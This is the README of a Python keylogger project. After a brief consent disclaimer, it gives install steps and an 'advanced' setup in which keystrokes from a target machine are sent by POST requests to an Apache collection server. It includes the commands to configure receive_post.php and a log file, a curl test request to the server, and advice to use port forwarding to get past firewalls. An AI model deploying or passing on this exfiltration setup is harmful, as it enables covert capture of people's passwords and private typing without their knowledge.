<h1 style="width:100%; text-align:center;">Py-Keylogger</h1>

Author: Prasanna Acharya

> ### Keyloggers can be a serious privacy concern and are illegal if used without explicit consent. Ensure you use such scripts only in legal and ethical scenarios.

## Installation

```bash
$ git clone https://github.com/imprasanna/py-keylogger
$ cd py-keylogger
$ python3 -m pip install -r requirements.txt
```

## Usage

There are two scripts for the keylogger. Let's run the simple one.

```bash
python3 simple.py
```

After running this script, the keystrokes on the same device will be recorded in the terminal.

## Advanced Usage

Script Reference: [David Bombal Github](https://github.com/davidbombal/python-keylogger)

To use this keylogger, set up the apache server on the device which will be recording the keystrokes and then run the script on the host device.

### Apache Server Setup

First, set up the apache server in the listening machine. <br>

This script works based on POST requests, so configure the server so that it can receive the POST data. <br>

- Copy the `receive_post.php` file to the given directory:

```bash
sudo cp ./receive_post.php /var/www/html/
```

- Set proper permissions for the file:

```bash
sudo chown www-data:www-data /var/www/html/receive_post.php
sudo chmod 644 /var/www/html/receive_post.php
```

- Create a log file and set proper permissions

```bash
sudo touch /var/log/apache2/post_requests.log
sudo chown www-data:www-data /var/log/apache2/post_requests.log
sudo chmod 664 /var/log/apache2/post_requests.log
```

- Run the apache server

```bash
sudo service apache2 start
sudo service apache2 enable
```

- Test the working by sending a test POST reqeust

```bash
curl -X POST http://<your_server_ip>/receive_post.php -H "Content-Type: application/json" -d '{"keyboardData": "test data"}'
```

- Read the POST data in the post_requests.log file

```bash
cat /var/log/apache2/post_requests.log
```

---

<br>
Now, you need to change the IP in the main.py script and then run the script in the host machine.

```bash
python3 main.py
```

<br>

> Note: _Use port forwarding if the Server IP is blocked by firewall._
